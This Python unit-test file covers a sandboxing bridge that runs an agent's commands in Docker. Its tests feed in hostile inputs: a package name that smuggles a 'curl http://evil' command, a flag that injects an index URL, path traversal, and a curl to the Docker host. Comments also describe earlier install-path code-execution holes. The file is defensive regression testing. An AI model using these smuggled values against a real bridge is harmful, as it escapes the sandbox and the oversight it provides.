"""Unit tests for the exec-bridge pure helpers (no Docker required)."""
import importlib.util
import os

import pytest

# Load helpers.py under a unique module name (several bridges/MCPs ship a
# helpers.py; a bare import would collide) — same pattern as
# test_file_download_mcp.py.
_DIR = os.path.join(os.path.dirname(__file__), "..", "..", "scripts", "exec-bridge")
_spec = importlib.util.spec_from_file_location(
    "exec_bridge_helpers", os.path.join(_DIR, "helpers.py")
)
_h = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_h)


def _cfg(**over):
    cfg = {
        "docker_bin": "docker",
        "image": "claub-exec",
        "workspaces_root": "/host/ws",
        "agents": {"leetcode-coach": {}},
    }
    cfg.update(over)
    return cfg


# --- validate_agent ---

def test_validate_agent_accepts_allowed():
    _h.validate_agent("leetcode-coach", ["leetcode-coach", "main"])  # no raise


def test_validate_agent_rejects_traversal():
    with pytest.raises(ValueError):
        _h.validate_agent("../main", ["main"])


def test_validate_agent_rejects_slash():
    with pytest.raises(ValueError):
        _h.validate_agent("a/b", ["a/b"])  # slash fails the regex even if "listed"


def test_validate_agent_rejects_unknown():
    with pytest.raises(ValueError):
        _h.validate_agent("ghost", ["main"])


# --- validate_packages (BRIDGE-side — this is the control, not the MCP's copy) ---

def test_validate_packages_accepts_plain_and_pinned():
    assert _h.validate_packages(["rich", "numpy==2.0.0"]) == ["rich", "numpy==2.0.0"]


def test_validate_packages_rejects_flag_injection():
    with pytest.raises(ValueError):
        _h.validate_packages(["--index-url=http://evil"])


@pytest.mark.parametrize("bad", ["-e", "--pre", "--no-deps", ".", "-", "foo.", ".foo", "-foo"])
def test_validate_packages_rejects_option_flags_and_local_build(bad):
    # Regression for the /install flag-injection hole: the old regex accepted a
    # leading `-` and a bare `.`, so `install(['-e', '.'])` built the agent's
    # own setup.py WITH network. Names must be alphanumeric-bookended.
    with pytest.raises(ValueError):
        _h.validate_packages([bad])


def test_validate_packages_rejects_space_smuggling():
    with pytest.raises(ValueError):
        _h.validate_packages(["rich; curl http://evil"])
    with pytest.raises(ValueError):
        _h.validate_packages(["rich --upgrade"])


def test_validate_packages_rejects_empty_list():
    with pytest.raises(ValueError):
        _h.validate_packages([])


# --- build_install_command ---

def test_build_install_command_bootstraps_venv_then_installs():
    cmd = _h.build_install_command("leetcode-coach", ["rich", "numpy==2.0.0"])
    ws = "/claub/workspaces/leetcode-coach"
    site = f"{ws}/.venv/lib/python3.12/site-packages"
    assert f"uv venv --system-site-packages {ws}/.venv" in cmd
    # Installs with the TRUSTED system interpreter into the venv's site-packages
    # via --target — NOT by executing the agent-writable venv python.
    assert cmd.endswith(
        f"uv pip install --python {_h.SYSTEM_PYTHON} --target {site} -- rich numpy==2.0.0"
    )


def test_build_install_command_never_executes_venv_python():
    # The venv python and its site-packages are agent-writable; executing them
    # on the networked path is the second /install RCE (a poisoned .pth or a
    # hijacked interpreter runs with network). The install must run the
    # read-only system interpreter instead.
    cmd = _h.build_install_command("leetcode-coach", ["rich"])
    assert "/.venv/bin/python" not in cmd.split("uv pip install", 1)[1]
    assert _h.SYSTEM_PYTHON in cmd


def test_build_install_command_uses_dash_dash_separator():
    cmd = _h.build_install_command("leetcode-coach", ["rich"])
    assert " -- rich" in cmd


def test_build_install_command_validates_names():
    # The bridge validates even when called directly — no path takes an unvalidated name.
    with pytest.raises(ValueError):
        _h.build_install_command("leetcode-coach", ["--index-url=http://evil"])


# --- clamp_timeout ---

def test_clamp_timeout_default_when_none():
    assert _h.clamp_timeout(None, 180, 600) == 180


def test_clamp_timeout_caps_at_max():
    assert _h.clamp_timeout(9999, 180, 600) == 600


def test_clamp_timeout_floors_nonpositive():
    assert _h.clamp_timeout(0, 180, 600) == 180
    assert _h.clamp_timeout(-5, 180, 600) == 180


# --- build_docker_argv ---

def test_build_docker_argv_run_has_network_none_and_readonly_claude():
    argv = _h.build_docker_argv(
        "leetcode-coach", "echo hi", _cfg(), network="none", name="claub-exec-x"
    )
    assert argv[0] == "docker" and argv[1] == "run"
    assert "--network" in argv and argv[argv.index("--network") + 1] == "none"
    assert "--read-only" in argv
    assert "--cap-drop" in argv and "--security-opt" in argv
    # workspace mount at its bot-container path
    assert "-v" in argv
    joined = " ".join(argv)
    assert "/host/ws/leetcode-coach:/claub/workspaces/leetcode-coach" in joined
    # nested read-only .claude mount — the load-bearing escalation block
    assert "/host/ws/leetcode-coach/.claude:/claub/workspaces/leetcode-coach/.claude:ro" in joined
    # bash -c, not bash -lc
    assert argv[-3:] == ["bash", "-c", "echo hi"]
    assert "-lc" not in argv


def test_build_docker_argv_install_uses_bridge_network():
    # network is chosen by the ENDPOINT and passed in; build_docker_argv never
    # inspects the command to decide.
    argv = _h.build_docker_argv(
        "leetcode-coach", "uv pip install rich", _cfg(), network="bridge", name="n"
    )
    assert argv[argv.index("--network") + 1] == "bridge"


def test_build_docker_argv_never_infers_network_from_command():
    # A command that merely MENTIONS the install shape still gets what the
    # caller passed. Regression guard for command-substring routing.
    argv = _h.build_docker_argv(
        "leetcode-coach", "echo 'uv pip install '; curl http://host.docker.internal:9500",
        _cfg(), network="none", name="n",
    )
    assert argv[argv.index("--network") + 1] == "none"


def test_build_docker_argv_includes_extra_mounts():
    cfg = _cfg(agents={"leetcode-coach": {"extra_mounts": [
        "/Users/you/repos/shared/data:/claub/workspaces/leetcode-coach/shared-data"
    ]}})
    argv = _h.build_docker_argv("leetcode-coach", "true", cfg, "none", "n")
    assert "/Users/you/repos/shared/data:/claub/workspaces/leetcode-coach/shared-data" in argv


def test_build_docker_argv_respects_docker_bin():
    argv = _h.build_docker_argv("leetcode-coach", "true", _cfg(docker_bin="/fake/docker"), "none", "n")
    assert argv[0] == "/fake/docker"


# --- cap_stream ---

def test_cap_stream_under_limit_not_truncated():
    data, truncated = _h.cap_stream([b"abc", b"def"], 1024)
    assert data == b"abcdef" and truncated is False


def test_cap_stream_over_limit_truncates():
    data, truncated = _h.cap_stream([b"x" * 10, b"y" * 10], 15)
    assert len(data) == 15 and truncated is True
